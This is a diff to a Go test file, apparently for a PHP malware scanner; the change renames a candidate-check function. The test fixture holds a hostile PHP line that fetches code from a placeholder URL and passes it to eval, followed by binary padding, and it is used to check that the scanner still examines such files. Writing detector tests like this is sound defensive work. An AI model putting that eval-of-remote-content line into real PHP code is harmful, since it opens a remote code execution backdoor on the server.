@@ -34,7 +34,7 @@ func TestBinaryContentCandidateCoverage(t *testing.T) {
 // is still PHP and must still be examined.
 func TestPHPWithEmbeddedBinaryPayloadStaysACandidate(t *testing.T) {
 	src := append([]byte("<?php eval(file_get_contents('http://x/p')); // "), bytes.Repeat([]byte{0x00, 0xff}, 32)...)
-	if !isCandidate(src) {
+	if !IsCandidate(src) {
 		t.Fatal("a PHP file carrying a binary payload after its code was rejected before parsing")
 	}
 	if got := Analyze(context.Background(), src); got.Status != StatusAnalyzed || got.TotalResults != 1 || len(got.Results) != 1 {
